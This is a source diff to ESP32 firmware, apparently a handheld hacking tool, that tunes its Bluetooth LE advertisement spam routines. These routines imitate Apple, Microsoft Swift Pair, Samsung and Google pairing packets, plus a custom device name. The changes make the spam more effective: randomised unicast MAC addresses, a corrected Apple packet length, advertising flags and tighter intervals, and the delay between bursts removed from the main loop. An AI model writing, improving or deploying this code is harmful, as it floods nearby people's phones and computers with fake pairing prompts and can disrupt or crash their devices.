@@ -345,8 +345,8 @@ void generateRandomMac(uint8_t *mac) {
 
         // It seems for some reason first 4 bits
         // Need to be high (aka 0b1111), so we
-        // OR with 0xF0
-        if (i == 0) { mac[i] |= 0xF0; }
+        // OR with 0xF0, and LSB must be 0 (for unicast)
+        if (i == 0) { mac[i] = (mac[i] | 0xF0) & 0xFE; }
     }
 }
 
@@ -388,14 +388,14 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
         case AppleJuice: {
             int rand = random(2);
             if (rand == 0) {
-                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
+                uint8_t packet[26] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                       0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                       0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+                                      0x00, 0x00};
 #ifdef NIMBLE_V2_PLUS
-                AdvData.addData(packet, 31);
+                AdvData.addData(packet, 26);
 #else
-                AdvData.addData(std::string((char *)packet, 31));
+                AdvData.addData(std::string((char *)packet, 26));
 #endif
             } else if (rand == 1) {
                 uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
@@ -506,21 +506,25 @@ void executeSpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
+
     BLEDevice::init("");
-    vTaskDelay(10 / portTICK_PERIOD_MS);
+    vTaskDelay(5 / portTICK_PERIOD_MS);
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
     pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
     BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
-    NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
-    pAdvertising->addServiceUUID(uuid);
+
+    advertisementData.setFlags(0x06);
+
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->setScanResponseData(oScanResponseData);
+    pAdvertising->setMinInterval(32);
+    pAdvertising->setMaxInterval(48);
     pAdvertising->start();
-    vTaskDelay(50 / portTICK_PERIOD_MS);
+    vTaskDelay(100 / portTICK_PERIOD_MS);
 
     pAdvertising->stop();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
+    vTaskDelay(5 / portTICK_PERIOD_MS);
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
@@ -532,6 +536,7 @@ void executeCustomSpam(String spamName) {
     // Generate random MAC address
     uint8_t macAddr[6];
     for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
+    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE; // Ensure unicast and random address
     // Set the MAC address
     esp_base_mac_addr_set(macAddr);
 
@@ -662,53 +667,47 @@ void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId
 
 void aj_adv(int ble_choice) { // customSet defaults to false
     int mael = 0;
-    int timer = 0;
     int count = 0;
     String spamName = "";
     if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
-    timer = millis();
     while (1) {
-        if (millis() - timer > 100) {
-
-            switch (ble_choice) {
-                case 0: // Applejuice
-                    displayTextLine("Applejuice (" + String(count) + ")");
+        switch (ble_choice) {
+            case 0: // Applejuice
+                displayTextLine("Applejuice (" + String(count) + ")");
+                executeSpam(AppleJuice);
+                break;
+            case 1: // SourApple
+                displayTextLine("SourApple (" + String(count) + ")");
+                executeSpam(AppleJuice);
+                break;
+            case 2: // SwiftPair
+                displayTextLine("SwiftPair  (" + String(count) + ")");
+                executeSpam(Microsoft);
+                break;
+            case 3: // Samsung
+                displayTextLine("Samsung  (" + String(count) + ")");
+                executeSpam(Samsung);
+                break;
+            case 4: // Android
+                displayTextLine("Android  (" + String(count) + ")");
+                executeSpam(Google);
+                break;
+            case 5: // Tutti-frutti
+                displayTextLine("Spam All  (" + String(count) + ")");
+                if (mael == 0) executeSpam(Google);
+                if (mael == 1) executeSpam(Samsung);
+                if (mael == 2) executeSpam(Microsoft);
+                if (mael == 3) executeSpam(SourApple);
+                if (mael == 4) {
                     executeSpam(AppleJuice);
-                    break;
-                case 1: // SourApple
-                    displayTextLine("SourApple (" + String(count) + ")");
-                    executeSpam(AppleJuice);
-                    break;
-                case 2: // SwiftPair
-                    displayTextLine("SwiftPair  (" + String(count) + ")");
-                    executeSpam(Microsoft);
-                    break;
-                case 3: // Samsung
-                    displayTextLine("Samsung  (" + String(count) + ")");
-                    executeSpam(Samsung);
-                    break;
-                case 4: // Android
-                    displayTextLine("Android  (" + String(count) + ")");
-                    executeSpam(Google);
-                    break;
-                case 5: // Tutti-frutti
-                    displayTextLine("Spam All  (" + String(count) + ")");
-                    if (mael == 0) executeSpam(Google);
-                    if (mael == 1) executeSpam(Samsung);
-                    if (mael == 2) executeSpam(Microsoft);
-                    if (mael == 3) executeSpam(SourApple);
-                    if (mael == 4) {
-                        executeSpam(AppleJuice);
-                        mael = 0;
-                    }
-                    break;
-                case 6: // custom
-                    displayTextLine("Spamming " + spamName + "(" + String(count) + ")");
-                    executeCustomSpam(spamName);
-            }
-            count++;
-            timer = millis();
+                    mael = 0;
+                }
+                break;
+            case 6: // custom
+                displayTextLine("Spamming " + spamName + "(" + String(count) + ")");
+                executeCustomSpam(spamName);
         }
+        count++;
 
         if (check(EscPress)) {
             returnToMenu = true;
